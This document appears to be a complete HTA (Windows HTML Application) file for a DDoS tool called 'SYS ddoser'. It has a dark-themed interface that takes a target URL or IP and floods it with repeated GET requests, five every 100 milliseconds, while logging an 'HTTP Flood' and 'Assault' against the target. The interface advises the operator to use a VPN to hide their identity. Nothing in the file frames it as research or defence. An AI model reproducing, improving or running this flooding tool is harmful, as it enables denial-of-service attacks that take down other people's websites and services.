<!DOCTYPE html>
<html>
<head>
    <title>SYS ddoser /made by kry</title>
    <hta:application 
        id="oApp" 
        applicationname="SYS_ddoser" 
        border="none" 
        caption="yes" 
        showintaskbar="yes" 
        singleinstance="yes" 
        sysmenu="no"
        windowstate="normal"
        scroll="no"
    />
    <style>
        :root {
            --primary-bg: #0f0f0f;
            --panel-bg: #1a1a1a;
            --border-color: #333333;
            --text-main: #e0e0e0;
            --text-dim: #707070;
            --accent-color: #ED1C24;
            --accent-glow: rgba(237, 28, 36, 0.15);
            --success-color: #10b981;
            --warning-color: #f59e0b;
        }

        body {
            background-color: var(--primary-bg);
            color: var(--text-main);
            font-family: 'Segoe UI', 'Consolas', monospace;
            margin: 0;
            padding: 0;
            overflow: hidden;
            user-select: none;
            cursor: default;
        }

        #title-bar {
            background-color: var(--panel-bg);
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 15px;
            border-bottom: 1px solid var(--border-color);
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }

        #logo-area {
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 600;
            font-size: 14px;
            color: var(--text-main);
            letter-spacing: 0.5px;
        }

        #logo-icon {
            width: 12px;
            height: 12px;
            background: var(--accent-color);
            clip-path: polygon(0 0, 100% 0, 100% 100%);
            transform: rotate(-45deg);
            opacity: 0.8;
        }

        #close-btn {
            background: none;
            border: none;
            color: var(--text-dim);
            font-size: 18px;
            cursor: pointer;
            padding: 0 5px;
        }

        #close-btn:hover {
            color: var(--text-main);
        }

        #main-container {
            display: flex;
            height: calc(100vh - 40px);
            padding: 20px;
            box-sizing: border-box;
            gap: 20px;
            background-color: var(--primary-bg);
        }

        #control-panel {
            width: 350px;
            background-color: var(--panel-bg);
            border-radius: 6px;
            padding: 20px;
            border: 1px solid var(--border-color);
            display: flex;
            flex-direction: column;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }

        #visual-panel {
            flex: 1;
            background-color: var(--panel-bg);
            border-radius: 6px;
            padding: 20px;
            border: 1px solid var(--border-color);
            display: flex;
            flex-direction: column;
            position: relative;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }

        h2, h3 {
            margin: 0 0 15px 0;
            font-size: 14px;
            font-weight: 600;
            color: var(--text-main);
            text-transform: uppercase;
            letter-spacing: 1px;
            opacity: 0.9;
        }

        label {
            display: block;
            margin-top: 15px;
            color: var(--text-dim);
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        input[type="text"] {
            width: 100%;
            background-color: #252525;
            border: 1px solid var(--border-color);
            color: var(--text-main);
            padding: 10px 10px;
            box-sizing: border-box;
            font-family: 'Consolas', monospace;
            font-size: 12px;
            border-radius: 4px;
            margin-top: 5px;
            transition: border-color 0.2s;
        }

        input[type="text"]:focus {
            outline: none;
            border-color: var(--text-dim);
        }

        #action-btn {
            width: 100%;
            padding: 12px;
            margin-top: 25px;
            background-color: #252525;
            border: 1px solid var(--border-color);
            color: var(--text-main);
            font-weight: 600;
            font-size: 12px;
            cursor: pointer;
            border-radius: 4px;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.2s;
        }

        #action-btn:hover {
            background-color: #303030;
            border-color: var(--text-dim);
        }

        #action-btn.active {
            background-color: var(--accent-color);
            border-color: var(--accent-color);
            color: white;
            box-shadow: 0 0 15px var(--accent-glow);
        }

        #action-btn.active:hover {
            background-color: #d11b1f;
        }

        #console-output {
            flex: 1;
            background-color: #000000;
            border: 1px solid var(--border-color);
            border-radius: 4px;
            padding: 10px;
            overflow-y: auto;
            font-size: 11px;
            color: var(--text-dim);
            margin-top: 15px;
            font-family: 'Consolas', monospace;
        }

        .log-entry {
            margin: 2px 0;
            opacity: 0.7;
        }

        .log-info {
            color: var(--text-dim);
        }

        .log-warning {
            color: var(--warning-color);
        }

        .log-success {
            color: var(--success-color);
        }

        .log-error {
            color: var(--accent-color);
        }

        #visualizer {
            height: 150px;
            background-color: #000000;
            border: 1px solid var(--border-color);
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
            margin-top: 15px;
        }

        .data-stream {
            position: absolute;
            width: 2px;
            height: 100%;
            background: linear-gradient(to bottom, transparent, var(--accent-color), transparent);
            opacity: 0.3;
            animation: stream-animation 2s infinite linear;
        }

        @keyframes stream-animation {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100%); }
        }

        #status-badge {
            position: absolute;
            top: 15px;
            right: 15px;
            padding: 4px 8px;
            background-color: #252525;
            color: var(--text-dim);
            border-radius: 3px;
            font-size: 10px;
            font-weight: 600;
            text-transform: uppercase;
            border: 1px solid var(--border-color);
        }

        .status-active {
            background-color: var(--accent-color);
            color: white;
            border-color: var(--accent-color);
            box-shadow: 0 0 10px var(--accent-glow);
        }

        #disclaimer {
            font-size: 10px;
            color: var(--text-dim);
            text-align: center;
            margin-top: 15px;
            opacity: 0.5;
            line-height: 1.4;
        }
    </style>

    <script>
        var attackInterval = null;
        var requestCount = 0;
        var errorCount = 0;
        var isRunning = false;

        function log(message, type = 'info') {
            var consoleDiv = document.getElementById('console-output');
            if (!consoleDiv) return;
            
            var entry = document.createElement('div');
            entry.className = 'log-entry';
            
            var timestamp = new Date().toLocaleTimeString();
            entry.innerHTML = '[' + timestamp + '] ' + message;
            
            if (type === 'error') {
                entry.className += ' log-error';
            } else if (type === 'success') {
                entry.className += ' log-success';
            } else if (type === 'warning') {
                entry.className += ' log-warning';
            }
            
            consoleDiv.appendChild(entry);
            consoleDiv.scrollTop = consoleDiv.scrollHeight;
            
            if (consoleDiv.children.length > 500) {
                consoleDiv.removeChild(consoleDiv.firstChild);
            }
        }

        function validateInput(input) {
            if (!input) return false;
            var urlPattern = /^https?:\/\/[a-zA-Z0-9\-\.]/i;
            if (urlPattern.test(input)) {
                return true;
            }
            return false;
        }

        function startAttack() {
            var target = document.getElementById('target').value.trim();
            
            if (!target) {
                log('ERROR: No target specified.', 'error');
                return;
            }

            if (!target.startsWith('http://') && !target.startsWith('https://')) {
                log('WARNING: Protocol missing. Adding http:// automatically.', 'warning');
                target = 'http://' + target;
                document.getElementById('target').value = target;
            }

            if (!validateInput(target)) {
                log('ERROR: Invalid format. Use http://example.com or http://1.2.3.4', 'error');
                return;
            }

            isRunning = true;
            requestCount = 0;
            errorCount = 0;
            
            var btn = document.getElementById('action-btn');
            if (btn) {
                btn.innerHTML = 'STOP';
                btn.className = 'active';
                btn.disabled = false;
            }
            
            var statusBadge = document.getElementById('status-badge');
            if (statusBadge) {
                statusBadge.className = 'status-active';
                statusBadge.innerText = 'ACTIVE';
            }
            
            log('NETWORK STRESS ON: ' + target, 'success');
            log('Mode: HTTP Flood (URL/IP)', 'info');
            
            var visualizer = document.getElementById('visualizer');
            if (visualizer) {
                visualizer.innerHTML = '';
                for(var i=0; i<5; i++) {
                    var stream = document.createElement('div');
                    stream.className = 'data-stream';
                    stream.style.left = (Math.random() * 100) + '%';
                    stream.style.animationDuration = (Math.random() * 1 + 0.5) + 's';
                    visualizer.appendChild(stream);
                }
            }

            attackInterval = setInterval(function() {
                if (!isRunning) return;
                
                for(var i = 0; i < 5; i++) {
                    sendRequest(target);
                }
                
                if (requestCount % 50 == 0) {
                    log('Status: Active. Requests sent: ' + requestCount, 'info');
                }
            }, 100);
        }

        function sendRequest(target) {
            try {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', target, true);
                xhr.timeout = 2000;
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4) {
                        requestCount++;
                    }
                };
                xhr.onerror = function() {
                    requestCount++; 
                };
                xhr.send();
                requestCount++;
            } catch (e) {
                errorCount++;
                log('Error sending request: ' + e.message, 'error');
            }
        }

        function stopAttack() {
            isRunning = false;
            if (attackInterval) {
                clearInterval(attackInterval);
                attackInterval = null;
            }
            
            var btn = document.getElementById('action-btn');
            if (btn) {
                btn.innerHTML = 'START';
                btn.className = '';
                btn.disabled = false;
            }
            
            var statusBadge = document.getElementById('status-badge');
            if (statusBadge) {
                statusBadge.className = '';
                statusBadge.innerText = 'IDLE';
            }
            
            log('Assault terminated. Total requests attempted: ' + requestCount, 'warning');
            log('System reset.', 'success');
            
            var visualizer = document.getElementById('visualizer');
            if (visualizer) {
                visualizer.innerHTML = '<div style="color: #555; text-align: center;"><br>WAITING FOR ACTIVATION</div>';
            }
        }

        function toggleAttack() {
            if (isRunning) {
                stopAttack();
            } else {
                startAttack();
            }
        }

        window.onload = function() {
            log('System initialized. Ready for command.', 'success');
            log('Supported targets: URLs (http://example.com) and IP Addresses (http://1.2.3.4)', 'info');
            log('made by SYS /kry .', 'warning');
        };

        window.onbeforeunload = function() {
            if (isRunning) {
                return 'Attack in progress. Are you sure you want to exit?';
            }
        };
    </script>
</head>
<body>
    <div id="title-bar">
        <div id="logo-area">
            <div id="logo-icon"></div>
            <span>SYS ddoser // made by kry</span>
        </div>
        <button id="close-btn" onclick="window.close()">X</button>
    </div>

    <div id="main-container">
        <div id="control-panel">
            <h2>Target Configuration</h2>
            
            <label>Target URL or IP Address</label>
            <input type="text" id="target" placeholder="http://example.com or http://1.2.3.4">
            
            <button id="action-btn" onclick="toggleAttack()">START</button>
            
            <div id="disclaimer">
                WARNING: use a vpn.<br>
                standard .
            </div>
        </div>

        <div id="visual-panel">
            <h2>Live Operations</h2>
            <div id="status-badge">IDLE</div>
            
            <div id="visualizer">
                <div style="color: #555; text-align: center;">
                    VISUALIZATION ENGINE<br>
                    WAITING FOR ACTIVATION
                </div>
            </div>
            
            <div id="console-output">
                <!-- Logs appear here -->
            </div>
        </div>
    </div>
</body>
</html>
